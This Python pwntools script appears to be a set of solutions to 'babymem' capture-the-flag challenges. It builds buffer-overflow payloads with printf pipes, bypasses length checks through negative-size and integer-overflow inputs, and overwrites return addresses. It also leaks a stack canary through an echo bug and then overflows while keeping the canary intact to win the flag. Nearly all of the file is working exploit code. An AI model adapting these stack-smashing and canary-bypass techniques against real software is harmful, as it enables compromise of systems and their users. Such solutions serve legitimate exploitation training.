#!/usr/bin/env python

from pwn import *

def hex2fmt_str(hex_number):
    byte_length = (hex_number.bit_length() + 7) // 8  # Calculate the number of bytes needed
    byte_string = hex_number.to_bytes(byte_length, byteorder='little')  # Convert to bytes in little-endian order
    formatted_string = ''.join(['\\x{:02x}'.format(byte) for byte in byte_string])
    return formatted_string

def fast_payload_gen(pre_len, value, challenge, pad_char = 'a', prefix = '', sign_mix = False, int_of = False):
    fmt_str = hex2fmt_str(value)
    val_len = len(fmt_str) // 4
    command = 'printf "' + str(pre_len + val_len) + '\\n'
    if(sign_mix == True):
        command = 'printf "' + '\\x2d1' + '\\n'
    elif(int_of):
        INT32_MIN = (1 << 31)
        command = 'printf "' + '2' + '\\n' + str(INT32_MIN) + '\\n'
    start_index = 0
    if(prefix != ''):
        start_index += 1
        command = command + prefix
    for i in range(start_index, pre_len):
        command = command + pad_char
    print(command + fmt_str + '" | /challenge/' + challenge)

def bytes_padding(len):
    byte_str = b''
    for i in range(len):
        byte_str = byte_str + b'\x90'
    return byte_str

def babymem_4_0():
    fast_payload_gen(88, 0x4024bc, 'babymem_level4.0', sign_mix = True)

def babymem_4_1():
    fast_payload_gen(72, 0x401b01, 'babymem_level4.1', sign_mix = True)

def babymem_5_0():
    fast_payload_gen(88, 0x4021cd, 'babymem_level5.0', int_of = True)

def babymem_5_1():
    fast_payload_gen(136, 0x401453, 'babymem_level5.1', int_of = True)

def bypass_canary(max_n, pre_len, target_n, byte1, byte2, challenge):
    cmd = 'printf "' + str(max_n) + '\\n'
    for i in range(0, pre_len):
        cmd = cmd + 'a'
    cmd = cmd + target_n + byte1 + byte2 + '" | /challenge/' + challenge
    print(cmd)

def leak_canary(pre_len, byte1, byte2, challenge, to_canary = -1):
    p = process('/challenge/' + challenge)

    # the first stage is to cause challenge() to leak the canary
    p.readuntil('Payload size: ')
    p.sendline(str(pre_len).encode('utf-8'))
    p.readuntil('bytes)!\n')
    p.sendline(b'REPEAT' + b'a' * (pre_len - 6))

    p.readuntil('You said: ')
    input_canary = p.read()
    print(b'leak the canary: ' + input_canary)
    canary = b'\x00' + input_canary[pre_len: pre_len + 7]
    print(canary)
    # the second stage is to overwrite the return address while keep the canary unmodified
    if(b'Payload size' not in input_canary):
        print('read until payload size...')
        p.readuntil('Payload size:')
    if(to_canary < 0):
        to_canary = pre_len - 1
    p.sendline(str(to_canary + 8 + 8 + 2).encode())
    p.readuntil('bytes)!\n')
    p.sendline(b'a' * to_canary + canary + b'a' * 8 + byte1 + byte2)
    p.readuntil('You win! Here is your flag:\n')
    print(p.readline())

# leak_canary(89, b'\xfc', b'\xa1', 'babymem_level12.0')
# leak_canary(41, b'\x74', b'\x29', 'babymem_level12.1')
# leak_canary(104 + 1, b'\xf9', b'\xd5', 'babymem_level14.0', to_canary = 376)
# leak_canary(8 + 1, b'\x10', b'\xc5', 'babymem_level14.1', to_canary = 280)
